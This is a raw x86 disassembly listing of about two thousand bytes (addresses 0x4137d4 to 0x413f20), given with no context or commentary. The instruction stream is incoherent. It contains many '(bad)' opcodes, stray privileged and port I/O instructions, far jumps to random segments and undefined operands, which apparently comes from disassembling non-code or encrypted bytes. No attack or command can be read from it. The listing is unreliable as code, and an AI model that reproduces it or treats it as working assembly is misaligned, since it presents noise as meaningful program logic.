  4137d4:	outs   dx,BYTE PTR ds:[esi]
  4137d5:	aad    0x9e
  4137d7:	repnz add esp,edx
  4137da:	ret    
  4137db:	sahf   
  4137dc:	ret    
  4137dd:	sti    
  4137de:	sub    eax,0xe4290bee
  4137e3:	retf   0xf9df
  4137e6:	fild   DWORD PTR [ebx]
  4137e8:	fsubr  st(6),st
  4137ea:	pop    es
  4137eb:	adc    DWORD PTR ds:0x598b995a,ebx
  4137f1:	loop   0x41386d
  4137f3:	les    eax,FWORD PTR [ebp+0x10]
  4137f6:	out    0x1,eax
  4137f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137f9:	pop    esp
  4137fa:	in     eax,dx
  4137fb:	jae    0x4137b4
  4137fd:	sub    dl,cl
  4137ff:	fidivr WORD PTR [edi]
  413801:	push   cs
  413802:	push   ebx
  413803:	sub    al,0x37
  413805:	lea    ebp,[edi-0x59]
  413808:	push   edi
  413809:	out    0x2e,eax
  41380b:	fiadd  WORD PTR [eax]
  41380d:	stos   BYTE PTR es:[edi],al
  41380e:	ja     0x4137c2
  413810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413811:	mov    esp,?
  413813:	sub    bl,al
  413815:	mov    bh,0x61
  413817:	pop    edi
  413818:	dec    ebx
  413819:	into   
  41381a:	sub    al,0x4e
  41381c:	xlat   BYTE PTR ds:[ebx]
  41381d:	or     ecx,DWORD PTR [eax-0x25]
  413820:	cmp    al,0x7a
  413822:	inc    ebx
  413823:	ins    BYTE PTR es:[edi],dx
  413824:	sub    eax,DWORD PTR [edi-0x37236503]
  41382a:	retf   
  41382b:	scas   eax,DWORD PTR es:[edi]
  41382c:	out    0xe6,al
  41382e:	cmp    al,0xce
  413830:	(bad)  
  413831:	cdq    
  413832:	repz daa 
  413834:	and    eax,0x1ed68d72
  413839:	jg     0x41386b
  41383b:	xor    eax,0x84a8d2b3
  413840:	lahf   
  413841:	rol    BYTE PTR ds:0xafcd88c3,1
  413847:	inc    ecx
  413848:	mov    al,BYTE PTR [edx]
  41384a:	in     eax,0x51
  41384c:	sub    BYTE PTR [eax-0x1f],ah
  41384f:	stos   BYTE PTR es:[edi],al
  413850:	sbb    al,0x8e
  413852:	clc    
  413853:	jo     0x41384d
  413855:	xchg   BYTE PTR [ecx],cl
  413857:	cmp    al,0xd5
  413859:	jae    0x413808
  41385b:	arpl   WORD PTR [ebx+0x2f],sp
  41385e:	jg     0x413809
  413860:	inc    edi
  413861:	pop    esp
  413862:	dec    eax
  413863:	into   
  413864:	pop    esp
  413865:	dec    ebp
  413866:	cmp    cl,BYTE PTR [ebp-0xf]
  413869:	mov    esp,esp
  41386b:	inc    ebp
  41386c:	outs   dx,BYTE PTR ds:[esi]
  41386d:	mov    cs,WORD PTR [edx+0x77]
  413870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413871:	imul   BYTE PTR [edi*2+0x769122c7]
  413878:	iret   
  413879:	xlat   BYTE PTR ds:[ebx]
  41387a:	sub    edi,ebx
  41387c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41387e:	inc    ebp
  41387f:	fistp  WORD PTR [eax]
  413881:	sub    DWORD PTR [ecx+0xb52234c],edi
  413887:	mov    edx,0x558bc098
  41388c:	dec    esp
  41388d:	inc    ebp
  41388e:	inc    ebp
  41388f:	hlt    
  413890:	stos   BYTE PTR es:[edi],al
  413891:	in     eax,dx
  413892:	(bad)  
  413893:	mov    esi,0x32589bb
  413898:	out    0x4,eax
  41389a:	add    eax,0x73092306
  41389f:	fiadd  DWORD PTR [edi-0x2e0f87e1]
  4138a5:	mov    eax,ds:0xc352bfe7
  4138aa:	js     0x41390c
  4138ac:	xchg   ebx,eax
  4138ad:	sub    ebp,DWORD PTR [edi]
  4138af:	xchg   edi,eax
  4138b0:	adc    al,0xa5
  4138b2:	(bad)  
  4138b3:	(bad)  
  4138b4:	cmp    al,0xcc
  4138b6:	sbb    ecx,eax
  4138b8:	call   0x3f48:0x94bca79b
  4138bf:	(bad)  
  4138c0:	es aam 0xa9
  4138c3:	push   0xffffffd4
  4138c5:	push   edx
  4138c6:	int3   
  4138c7:	mov    BYTE PTR [eax+0x1480159c],bl
  4138cd:	jno    0x4138ed
  4138cf:	outs   dx,DWORD PTR ds:[esi]
  4138d0:	dec    edi
  4138d1:	ret    
  4138d2:	ret    
  4138d3:	jp     0x413887
  4138d5:	or     BYTE PTR [ecx],bh
  4138d7:	inc    edi
  4138d8:	mov    dh,0xb6
  4138da:	pop    ecx
  4138db:	scas   al,BYTE PTR es:[edi]
  4138dc:	bound  esi,QWORD PTR [edi-0x1d]
  4138df:	lods   al,BYTE PTR ds:[esi]
  4138e0:	jno    0x4138a7
  4138e2:	xor    DWORD PTR [esi],esp
  4138e4:	sbb    BYTE PTR [ebx+edx*2-0x27],cl
  4138e8:	stc    
  4138e9:	add    al,0x5c
  4138eb:	and    eax,0x8cefb248
  4138f0:	mov    ah,cl
  4138f2:	(bad)  
  4138f3:	cli    
  4138f4:	retf   
  4138f5:	int3   
  4138f6:	sub    DWORD PTR [eax+edi*2],eax
  4138f9:	xor    al,bh
  4138fb:	fwait
  4138fc:	and    BYTE PTR [ecx],dh
  4138fe:	bound  esp,QWORD PTR [ebp+0x648c0da1]
  413904:	loope  0x413902
  413906:	test   al,0x69
  413908:	push   edi
  413909:	adc    BYTE PTR [edx+edx*1+0x430c539d],ch
  413910:	jmp    0x4138a6
  413912:	loop   0x413925
  413914:	jle    0x413992
  413916:	cmp    al,0x8d
  413918:	xchg   BYTE PTR [esi+0x72],dh
  41391b:	xchg   DWORD PTR [eax-0x7aff5312],ebp
  413921:	adc    ebp,DWORD PTR cs:[ebx+ecx*8]
  413925:	shl    BYTE PTR [ebx],1
  413927:	xor    BYTE PTR [edi],0x35
  41392a:	mov    WORD PTR [eax-0x6c],?
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	mov    esi,0x77cee941
  413933:	stos   BYTE PTR es:[edi],al
  413934:	clc    
  413935:	call   0x736c13c5
  41393a:	in     eax,dx
  41393b:	xor    esp,edi
  41393d:	mov    bl,0x8c
  41393f:	push   es
  413940:	mov    eax,0xbd0bda6d
  413945:	inc    edi
  413946:	or     al,cl
  413948:	push   0x7a
  41394a:	mov    BYTE PTR ds:0xfa3c7f2f,al
  413950:	pop    esi
  413951:	mov    dh,BYTE PTR [esi-0x5871a8f9]
  413957:	dec    ecx
  413958:	test   cl,0x39
  41395b:	inc    esp
  41395c:	in     eax,dx
  41395d:	mov    bh,0x3c
  41395f:	jno    0x41398e
  413961:	fucomip st,st(6)
  413963:	inc    ebp
  413964:	out    0xe6,al
  413966:	cmp    BYTE PTR [ecx+0x7],dh
  413969:	push   es
  41396a:	scas   al,BYTE PTR es:[edi]
  41396b:	add    dh,BYTE PTR [edx-0x1461babf]
  413971:	call   0x1860:0x9aeea027
  413978:	cli    
  413979:	sbb    ebp,DWORD PTR [ebx-0x8b7c8e7]
  41397f:	and    edi,DWORD PTR [ecx+0x59]
  413982:	mov    ecx,0x5de689c8
  413987:	jo     0x4139dc
  413989:	cmp    eax,ebp
  41398b:	xchg   esp,eax
  41398c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41398d:	test   al,0x2f
  41398f:	jecxz  0x4139ab
  413991:	and    DWORD PTR [edx+0x7],ebx
  413994:	(bad)  
  413995:	jecxz  0x413961
  413997:	pop    ebp
  413998:	push   ss
  413999:	fld    TBYTE PTR [ecx+eax*8]
  41399c:	mov    ds:0x2f91d829,eax
  4139a1:	loop   0x413a20
  4139a3:	jmp    0x306dc80d
  4139a8:	lods   al,BYTE PTR ds:[esi]
  4139a9:	jne    0x4139d2
  4139ab:	mov    esi,0xed67b9bc
  4139b0:	jg     0x413992
  4139b2:	pop    ds
  4139b3:	outs   dx,BYTE PTR ds:[esi]
  4139b4:	mov    bh,0x7f
  4139b6:	scas   eax,DWORD PTR es:[edi]
  4139b7:	jo     0x413a27
  4139b9:	and    esi,esi
  4139bb:	dec    edx
  4139bc:	add    ebx,DWORD PTR [edx-0x79]
  4139bf:	out    0x8,al
  4139c1:	push   cs
  4139c2:	fld    QWORD PTR [ecx-0x5bc9d0c]
  4139c8:	inc    ebp
  4139c9:	sbb    ecx,ebp
  4139cb:	ins    DWORD PTR es:[edi],dx
  4139cc:	push   eax
  4139cd:	out    dx,eax
  4139ce:	repz mov al,ds:0x88d20b8
  4139d4:	cmp    eax,0x6f1ea5ab
  4139d9:	lds    ebp,FWORD PTR [eax]
  4139db:	test   BYTE PTR [ebp+ebp*1-0x54],dh
  4139df:	push   0x43c89e37
  4139e4:	jmp    0xb6c6:0xa3ce6b75
  4139eb:	iret   
  4139ec:	outs   dx,DWORD PTR ds:[esi]
  4139ed:	leave  
  4139ee:	(bad)  
  4139ef:	push   esp
  4139f0:	iret   
  4139f1:	push   0xa2d7485
  4139f6:	icebp  
  4139f7:	pop    ebx
  4139f8:	mov    DWORD PTR [esi],edi
  4139fa:	adc    esi,esi
  4139fc:	test   BYTE PTR [esi-0x4a],ch
  4139ff:	sbb    ah,ah
  413a01:	sbb    al,0x63
  413a03:	ds stc 
  413a05:	sbb    cl,BYTE PTR [edx-0x62]
  413a08:	ret    
  413a09:	add    BYTE PTR [edi],dh
  413a0b:	test   al,0x8
  413a0d:	jmp    FWORD PTR [eax]
  413a0f:	retf   
  413a10:	pop    eax
  413a11:	mov    ah,0x3d
  413a13:	rcr    DWORD PTR [edx+0x22caaf9f],cl
  413a19:	xor    al,BYTE PTR gs:[ecx+0x75b17d8e]
  413a20:	cmp    al,0xb8
  413a22:	retf   
  413a23:	aaa    
  413a24:	retf   
  413a25:	push   ss
  413a26:	and    BYTE PTR [edx-0x29b212ac],ah
  413a2c:	push   ebp
  413a2d:	(bad)  
  413a2e:	and    al,0x6d
  413a30:	repz arpl WORD PTR [edx+0x52592f01],ax
  413a37:	sub    esi,DWORD PTR [esi+0x14990ddc]
  413a3d:	hlt    
  413a3e:	lahf   
  413a3f:	sbb    al,0x60
  413a41:	test   al,0x43
  413a43:	mov    bh,0xc2
  413a45:	(bad)  
  413a46:	fnstsw WORD PTR [esi-0x6a]
  413a49:	js     0x413a72
  413a4b:	pusha  
  413a4c:	jl     0x413a2a
  413a4e:	rol    DWORD PTR [eax],cl
  413a50:	xchg   esi,eax
  413a51:	scas   eax,DWORD PTR es:[di]
  413a53:	fcmovnu st,st(0)
  413a55:	outs   dx,DWORD PTR ds:[esi]
  413a56:	jns    0x413a52
  413a58:	idiv   edi
  413a5a:	js     0x413aa8
  413a5c:	sub    ebp,DWORD PTR [ebp-0x4d11983e]
  413a62:	lahf   
  413a63:	add    DWORD PTR [ebx],esp
  413a65:	xor    ah,BYTE PTR [edi+0x29]
  413a68:	add    BYTE PTR [eax-0x11],bl
  413a6b:	dec    ebx
  413a6c:	mov    edi,0x42919d99
  413a71:	xor    bh,BYTE PTR [edi+0x74]
  413a74:	add    al,0x80
  413a76:	daa    
  413a77:	iret   
  413a78:	stc    
  413a79:	rcl    DWORD PTR [edx-0xa],cl
  413a7c:	pop    edx
  413a7d:	into   
  413a7e:	fisttp WORD PTR [edi+eiz*2-0x222cb7ee]
  413a85:	outs   dx,DWORD PTR ds:[esi]
  413a86:	popf   
  413a87:	sahf   
  413a88:	jne    0x413a2d
  413a8a:	lds    di,DWORD PTR [edi-0x2c175fca]
  413a91:	add    BYTE PTR [esi+0x1ee1b3b8],cl
  413a97:	hlt    
  413a98:	adc    ch,BYTE PTR [ecx]
  413a9a:	pop    DWORD PTR [esi+edx*1-0x80]
  413a9e:	lods   al,BYTE PTR cs:[esi]
  413aa0:	and    bl,BYTE PTR [esi]
  413aa2:	jmp    0x413a8f
  413aa4:	push   0x517a0e7
  413aa9:	dec    ecx
  413aaa:	adc    bl,0x11
  413aad:	out    0x86,al
  413aaf:	push   ss
  413ab0:	mov    edi,0xae3b989c
  413ab5:	push   cs
  413ab6:	pop    es
  413ab7:	xchg   ebp,eax
  413ab8:	test   al,0xf3
  413aba:	pop    esp
  413abb:	mov    eax,ds:0x744c0dad
  413ac0:	bound  ecx,QWORD PTR [esi+0x57fe8061]
  413ac6:	pushf  
  413ac7:	ins    DWORD PTR es:[edi],dx
  413ac8:	cwde   
  413ac9:	xchg   ebp,eax
  413aca:	stos   DWORD PTR es:[edi],eax
  413acb:	pushf  
  413acc:	or     bh,bh
  413ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413acf:	dec    ebx
  413ad0:	jge    0x413a99
  413ad2:	sbb    bh,BYTE PTR [edx]
  413ad4:	jns    0x413b2e
  413ad6:	jge    0x413b25
  413ad8:	(bad)  
  413ad9:	neg    BYTE PTR [ebx-0x4645ff3f]
  413adf:	sbb    dh,ch
  413ae1:	aam    0xc1
  413ae3:	adc    ch,dl
  413ae5:	test   DWORD PTR [ebp+0x2a78effe],0x8d462507
  413aef:	xchg   ebx,eax
  413af0:	sti    
  413af1:	adc    al,0xd8
  413af3:	sub    DWORD PTR [eax-0x2f291f49],ebp
  413af9:	push   eax
  413afa:	wrmsr  
  413afc:	add    al,0x89
  413afe:	adc    dl,ah
  413b00:	cmp    esp,0x1a
  413b03:	xchg   ecx,eax
  413b04:	lods   al,BYTE PTR es:[esi]
  413b06:	jg     0x413aa9
  413b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b09:	popa   
  413b0a:	jle    0x413b05
  413b0c:	repnz push ds
  413b0e:	gs das 
  413b10:	sbb    al,0x82
  413b12:	dec    ecx
  413b13:	xlat   BYTE PTR ds:[ebx]
  413b14:	xor    esi,0x44
  413b17:	data16 add BYTE PTR [ecx-0x4204592d],0xb2
  413b1f:	sub    ecx,DWORD PTR [edx-0x6e]
  413b22:	outs   dx,DWORD PTR gs:[esi]
  413b24:	jbe    0x413aee
  413b26:	ds pop ecx
  413b28:	adc    BYTE PTR [ebp+0x7f24aa9],dh
  413b2e:	pop    ss
  413b2f:	xchg   ebx,eax
  413b30:	pop    edx
  413b32:	sub    eax,ecx
  413b34:	aas    
  413b35:	xor    al,0x4c
  413b37:	mov    ds:0xc9aafca6,eax
  413b3c:	mov    ecx,0x1f4fa7a6
  413b41:	mov    ch,0x8
  413b43:	cmp    DWORD PTR [ebx],0xffffff8e
  413b46:	or     ebx,esi
  413b48:	push   esi
  413b49:	adc    al,dl
  413b4b:	hlt    
  413b4c:	jo     0x413b61
  413b4e:	out    dx,eax
  413b4f:	int3   
  413b50:	fst    st(7)
  413b52:	adc    bl,BYTE PTR [ebx]
  413b54:	imul   esi,ebp,0x54
  413b57:	sub    eax,0xce814b99
  413b5c:	xor    ah,BYTE PTR [edi-0x2]
  413b5f:	sub    al,0x5b
  413b61:	jmp    0x413bc0
  413b63:	test   eax,0x66851c65
  413b68:	lds    ebx,FWORD PTR [ecx+0x6b10fc33]
  413b6e:	xor    al,0x9e
  413b70:	dec    ebx
  413b71:	mov    cl,0xd
  413b73:	fs push ds
  413b75:	mov    BYTE PTR [ecx+0x10],ch
  413b78:	fnstcw WORD PTR [esi-0x66b74d2]
  413b7e:	iret   
  413b7f:	or     BYTE PTR [ebp-0x5b],ch
  413b82:	pop    ss
  413b83:	jecxz  0x413bd6
  413b85:	popa   
  413b86:	sbb    bh,0xe9
  413b89:	inc    ecx
  413b8a:	push   ss
  413b8b:	pop    ds
  413b8c:	sar    BYTE PTR [edi-0x45af869],1
  413b92:	jbe    0x413bac
  413b94:	or     BYTE PTR [ebx],bl
  413b96:	imul   edx,DWORD PTR [ecx],0xb
  413b99:	(bad)  
  413b9a:	call   0xd9e7:0x40b2e7bb
  413ba1:	sub    ah,BYTE PTR [edi-0x2bdd5e2e]
  413ba7:	int    0x6a
  413ba9:	or     dl,BYTE PTR [eax+ebp*2+0x2574b265]
  413bb0:	adc    esi,eax
  413bb2:	iret   
  413bb3:	test   eax,0x5596496
  413bb8:	xchg   esi,eax
  413bb9:	mov    al,ds:0xd73b14a4
  413bbe:	scas   eax,DWORD PTR es:[edi]
  413bbf:	and    BYTE PTR [ebx+0x18],dh
  413bc2:	imul   esp,DWORD PTR [edx],0xbfd2c6ae
  413bc8:	jae    0x413b71
  413bca:	and    DWORD PTR [ebp+0x3e088fd6],esp
  413bd0:	ins    DWORD PTR es:[edi],dx
  413bd1:	imul   DWORD PTR [edx-0x2c477c6]
  413bd7:	pop    esp
  413bd8:	(bad)  
  413bd9:	scas   al,BYTE PTR es:[edi]
  413bda:	cmp    cl,dh
  413bdc:	sbb    eax,0xbff8fb2a
  413be1:	cmp    eax,edi
  413be3:	jle    0x413bab
  413be5:	ror    DWORD PTR [eax],1
  413be7:	or     cl,BYTE PTR [ebx+0x6b]
  413bea:	or     BYTE PTR [edx-0x80],0x8b
  413bee:	lahf   
  413bef:	sub    edx,DWORD PTR [edx]
  413bf1:	iret   
  413bf2:	xor    dh,dh
  413bf4:	fucomp st(5)
  413bf6:	repz aam 0x48
  413bf9:	sbb    DWORD PTR [esi],edi
  413bfb:	cmp    DWORD PTR [ebp-0x3a],0x60126c0f
  413c02:	pop    ecx
  413c03:	jmp    0x413c48
  413c05:	popf   
  413c06:	jecxz  0x413baf
  413c08:	jl     0x413bf8
  413c0a:	out    dx,al
  413c0b:	jnp    0x413b9e
  413c0d:	jne    0x413c4e
  413c0f:	jne    0x413bc4
  413c11:	pop    eax
  413c12:	mov    DWORD PTR [ebp+0x50e542c8],ecx
  413c18:	xchg   ebx,eax
  413c19:	inc    ebp
  413c1a:	(bad)  
  413c1b:	pusha  
  413c1c:	sub    dl,BYTE PTR [esi-0x4c04e1b2]
  413c22:	popf   
  413c23:	aad    0xfb
  413c25:	scas   al,BYTE PTR es:[edi]
  413c26:	hlt    
  413c27:	iret   
  413c28:	xor    ch,BYTE PTR [eax+0x45]
  413c2b:	add    DWORD PTR [edx+ebx*2-0x3b],esp
  413c2f:	xchg   esi,eax
  413c30:	test   dh,0x68
  413c33:	stc    
  413c34:	addr16 popf 
  413c36:	repz adc dl,dh
  413c39:	and    bl,ch
  413c3b:	mov    ebx,0x9b342996
  413c40:	mov    WORD PTR [ecx],ss
  413c42:	fdivr  DWORD PTR [ecx+ecx*8]
  413c45:	sbb    ch,bl
  413c47:	test   al,0x25
  413c49:	dec    ebx
  413c4a:	jae    0x413c6f
  413c4c:	add    ch,BYTE PTR [ebx]
  413c4e:	data16 aam 0xfa
  413c51:	in     al,dx
  413c52:	add    DWORD PTR [ebp+eax*1-0x326d5658],esp
  413c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c5a:	shl    DWORD PTR [edx+eiz*4],cl
  413c5d:	inc    esp
  413c5e:	jmp    0x39d6e14
  413c63:	mov    DWORD PTR [esi+0x11],eax
  413c66:	mov    ebp,0xe20d4719
  413c6b:	ficom  DWORD PTR [edx-0x6b]
  413c6e:	mov    esp,0xbb9b127c
  413c73:	inc    esi
  413c74:	sub    al,0xac
  413c76:	sbb    eax,0x4e01dcb3
  413c7b:	into   
  413c7c:	jae    0x413c2a
  413c7e:	xchg   esp,eax
  413c7f:	lea    ecx,[edx+0x2c]
  413c82:	pop    ebx
  413c83:	pop    ebp
  413c84:	push   ebx
  413c85:	hlt    
  413c86:	retf   
  413c87:	ss repz push edi
  413c8a:	jl     0x413c89
  413c8c:	dec    ebp
  413c8d:	fnsave [edx-0x180062aa]
  413c93:	adc    DWORD PTR [edi-0x74],ecx
  413c96:	sbb    al,dh
  413c98:	out    dx,eax
  413c99:	test   eax,0xfa92f9d2
  413c9e:	imul   ecx,DWORD PTR [eax-0x4fedef63],0x26
  413ca5:	xchg   ebp,eax
  413ca6:	mov    esp,0xb5328d27
  413cab:	shl    dh,1
  413cad:	clc    
  413cae:	xor    edx,DWORD PTR [eax]
  413cb0:	sbb    cl,bl
  413cb2:	pop    DWORD PTR [edi-0x6b]
  413cb5:	outs   dx,BYTE PTR ds:[esi]
  413cb6:	cs loopne 0x413c66
  413cb9:	adc    eax,0xff1ec9d9
  413cbe:	sbb    BYTE PTR [eax],ah
  413cc0:	mov    dh,0xc2
  413cc2:	cli    
  413cc3:	icebp  
  413cc4:	mov    esp,0x91c8bdd
  413cc9:	loopne 0x413d29
  413ccb:	es ja  0x413d0f
  413cce:	jge    0x413c71
  413cd0:	sub    al,0x8
  413cd2:	xchg   edx,eax
  413cd3:	mov    bl,dh
  413cd5:	push   ecx
  413cd6:	stos   BYTE PTR es:[edi],al
  413cd7:	dec    esi
  413cd8:	outs   dx,DWORD PTR ds:[esi]
  413cd9:	inc    ebp
  413cda:	dec    edx
  413cdb:	add    eax,0xa47fde85
  413ce0:	sbb    al,0x52
  413ce2:	or     eax,DWORD PTR [ebp+ebp*8-0x5d2f7850]
  413ce9:	mov    cs,ebx
  413ceb:	(bad)  
  413ced:	push   0x609b10f6
  413cf2:	mov    ebx,0xb34d0dc2
  413cf7:	data16 jns 0x413d67
  413cfa:	xor    al,0x4e
  413cfc:	fld    TBYTE PTR [ecx+eiz*4-0x173a370d]
  413d03:	and    DWORD PTR [ebx-0x15bd2dd2],esi
  413d09:	and    ah,0x18
  413d0c:	mov    edx,DWORD PTR [ecx-0x48685488]
  413d12:	jp     0x413d51
  413d14:	lahf   
  413d15:	test   DWORD PTR [edi-0x31],ebp
  413d18:	sub    esi,DWORD PTR [esp+edi*2+0x3d72648f]
  413d1f:	push   edx
  413d20:	fcomp  QWORD PTR [edx+edx*4+0x7e]
  413d24:	(bad)  
  413d25:	and    esp,eax
  413d27:	lock add BYTE PTR [edi],cl
  413d2a:	(bad)  
  413d2b:	out    0xdb,al
  413d2d:	cmp    BYTE PTR [ebx],0x6d
  413d30:	jno    0x413d9f
  413d32:	sbb    eax,0x22a2698
  413d37:	jnp    0x413d5d
  413d39:	xor    cl,dh
  413d3b:	lahf   
  413d3c:	inc    edi
  413d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3e:	jl     0x413d9c
  413d40:	dec    eax
  413d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d42:	xor    al,0x8b
  413d44:	mov    bh,0x87
  413d46:	and    ch,cl
  413d48:	(bad)  
  413d49:	cdq    
  413d4a:	pushf  
  413d4b:	jp     0x413d5b
  413d4d:	maskmovq mm7,(bad)
  413d4e:	idiv   DWORD PTR [ebp+0x16]
  413d51:	jmp    0xf0fc:0x250bc56f
  413d58:	or     edi,DWORD PTR [ecx+ebp*8+0x3a28375d]
  413d5f:	(bad)  
  413d60:	data16 xor dl,dl
  413d63:	fnstcw WORD PTR [ecx+0xb]
  413d66:	loop   0x413d9c
  413d68:	dec    ecx
  413d69:	mov    ebx,0xf33d1003
  413d6e:	repz lds esp,FWORD PTR [edx-0x13]
  413d72:	xchg   BYTE PTR [ebx-0x64],bl
  413d75:	inc    edx
  413d76:	mov    esp,0x21e62d38
  413d7b:	mov    esi,0x4c25aa52
  413d80:	(bad)  
  413d81:	out    dx,eax
  413d82:	outs   dx,DWORD PTR ds:[esi]
  413d83:	fild   DWORD PTR [eax]
  413d85:	push   edi
  413d86:	ja     0x413d42
  413d88:	inc    ebx
  413d89:	inc    eax
  413d8a:	test   BYTE PTR [ecx+0x6ec9719e],ch
  413d90:	(bad)  
  413d91:	stos   BYTE PTR es:[edi],al
  413d92:	fsub   QWORD PTR [ebx+0x1c]
  413d95:	or     esp,esi
  413d97:	mov    dh,0x52
  413d99:	pop    edx
  413d9a:	popf   
  413d9b:	or     ebx,DWORD PTR [ebp+0x37b0e79d]
  413da1:	mov    dl,BYTE PTR [eax+0xe]
  413da4:	fisub  DWORD PTR [eax-0x59]
  413da7:	imul   BYTE PTR [ecx-0x2b7985dc]
  413dad:	xchg   edx,eax
  413dae:	outs   dx,DWORD PTR ds:[esi]
  413daf:	stos   BYTE PTR es:[edi],al
  413db0:	mov    dh,BYTE PTR [edi+0x48ad96b6]
  413db6:	lds    edi,FWORD PTR [edx-0x27607e08]
  413dbc:	in     al,0x59
  413dbe:	xor    BYTE PTR [esi+edx*4+0x675c093f],bh
  413dc5:	icebp  
  413dc6:	in     eax,0x33
  413dc8:	stos   BYTE PTR es:[edi],al
  413dc9:	(bad)  
  413dca:	call   0xbcdaaf45
  413dcf:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dd1:	adc    ebp,DWORD PTR [edi-0x76]
  413dd4:	cdq    
  413dd5:	iret   
  413dd6:	in     al,dx
  413dd7:	(bad)  
  413dd8:	js     0x413d77
  413dda:	xchg   edi,eax
  413ddb:	adc    al,0x28
  413ddd:	jbe    0x413d82
  413ddf:	push   ss
  413de0:	adc    edi,ebp
  413de2:	sti    
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	lea    eax,[ebx]
  413de6:	push   DWORD PTR [edx+0x143533e3]
  413dec:	mov    ah,0x4b
  413dee:	push   ebp
  413def:	fwait
  413df0:	sub    eax,0xd2c83e44
  413df5:	push   edx
  413df6:	xor    ecx,esp
  413df8:	into   
  413df9:	fsub   QWORD PTR [eax-0x50d23888]
  413dff:	inc    ebp
  413e00:	loope  0x413e64
  413e02:	loope  0x413db6
  413e04:	das    
  413e05:	fs sbb eax,0x8c85256
  413e0b:	cmc    
  413e0c:	xchg   DWORD PTR [ebx-0x8dd7493],ebx
  413e12:	iret   
  413e13:	xor    al,0x3
  413e15:	sbb    ax,0xd1f3
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	inc    ebp
  413e1b:	adc    bh,0x74
  413e1e:	fnsave [ebx-0x3d3d768]
  413e24:	dec    ecx
  413e25:	xchg   esp,eax
  413e26:	jmp    0x572c7b8
  413e2b:	sbb    ecx,DWORD PTR [edi]
  413e2d:	fld    TBYTE PTR [ebx-0x5f1d21aa]
  413e33:	inc    edi
  413e34:	cmp    al,BYTE PTR [eax]
  413e36:	popa   
  413e37:	(bad)  
  413e38:	and    esp,edi
  413e3a:	imul   edx,ecx,0xffffffae
  413e3d:	stc    
  413e3e:	cmp    BYTE PTR [ebx+0x286ff94a],al
  413e44:	les    edi,FWORD PTR [edx]
  413e46:	or     eax,0x252fd4db
  413e4b:	add    edx,edx
  413e4d:	test   al,0x84
  413e50:	lahf   
  413e51:	xor    dh,BYTE PTR [ebp-0x53fa6a43]
  413e57:	repz int 0xf8
  413e5a:	mov    ecx,0xa5589e44
  413e5f:	sub    bl,BYTE PTR [edx]
  413e61:	outs   dx,BYTE PTR ds:[esi]
  413e62:	xor    cl,dl
  413e64:	inc    esp
  413e65:	enter  0xd03f,0x96
  413e69:	mov    BYTE PTR [eax+0x60],ch
  413e6c:	jle    0x413e0f
  413e6e:	rcl    DWORD PTR [edx-0x71d8e025],0xf1
  413e75:	push   cs
  413e76:	clc    
  413e77:	and    DWORD PTR [esi+0x36a331c6],0xd410caea
  413e81:	mov    al,0x96
  413e83:	pop    ebx
  413e84:	out    dx,al
  413e85:	lea    esi,[eax+0x61]
  413e88:	lods   al,BYTE PTR ds:[esi]
  413e89:	ja     0x413ed2
  413e8b:	ret    0x5b22
  413e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e8f:	aaa    
  413e90:	xlat   BYTE PTR ds:[ebx]
  413e91:	jmp    0x413e21
  413e93:	xchg   ebx,eax
  413e94:	out    dx,eax
  413e95:	pusha  
  413e96:	xchg   ebp,eax
  413e97:	or     bh,BYTE PTR [ebx]
  413e99:	mov    esi,0xfa013fcb
  413e9e:	mov    esp,0xe57bd611
  413ea3:	inc    ecx
  413ea4:	xchg   edi,eax
  413ea5:	data16 int 0xfe
  413ea8:	or     BYTE PTR [ebx+eax*8-0x9],al
  413eac:	mov    ecx,0xe1eac818
  413eb1:	xlat   BYTE PTR ds:[ebx]
  413eb2:	dec    esp
  413eb3:	scas   al,BYTE PTR es:[edi]
  413eb4:	mov    dl,0x3c
  413eb6:	add    ebx,0xffffff9f
  413eb9:	into   
  413eba:	hlt    
  413ebb:	xchg   ecx,eax
  413ebc:	dec    esp
  413ebd:	scas   al,BYTE PTR es:[edi]
  413ebe:	inc    eax
  413ebf:	or     ch,BYTE PTR [edi]
  413ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ec2:	and    eax,0x303a19ec
  413ec7:	jbe    0x413f09
  413ec9:	mov    edi,0xa498f108
  413ece:	pop    es
  413ecf:	enter  0xe524,0x64
  413ed3:	dec    ebx
  413ed4:	(bad)
  413ed8:	mov    esp,ss
  413eda:	push   edi
  413edb:	dec    ecx
  413edc:	popf   
  413edd:	push   ss
  413ede:	push   es
  413edf:	aam    0x91
  413ee1:	jl     0x413ea4
  413ee3:	add    al,BYTE PTR [ebx+0x1d10143e]
  413ee9:	pushf  
  413eea:	les    esp,FWORD PTR [ebx]
  413eec:	xchg   ecx,eax
  413eed:	cmp    ah,BYTE PTR [edi-0x4c]
  413ef0:	repz xor edi,DWORD PTR [ebp+0x5a]
  413ef4:	xor    al,0x17
  413ef6:	xchg   ebx,eax
  413ef7:	sub    BYTE PTR [ecx+0x1],cl
  413efa:	iret   
  413efb:	and    BYTE PTR [edi+0x4c],dh
  413efe:	rcl    ebx,cl
  413f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f01:	mov    ebp,eax
  413f03:	out    0xb7,al
  413f05:	pop    esp
  413f06:	mov    ebp,0x7ca956a6
  413f0b:	push   es
  413f0c:	xor    esp,DWORD PTR [edx-0x2b]
  413f0f:	mov    edi,0xb3558eed
  413f14:	push   ecx
  413f15:	les    edi,FWORD PTR [eax-0x2c]
  413f18:	add    eax,0x26b529c9
  413f1d:	xor    esp,DWORD PTR [eax]
  413f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f20:	ins    DWORD PTR es:[edi],dx
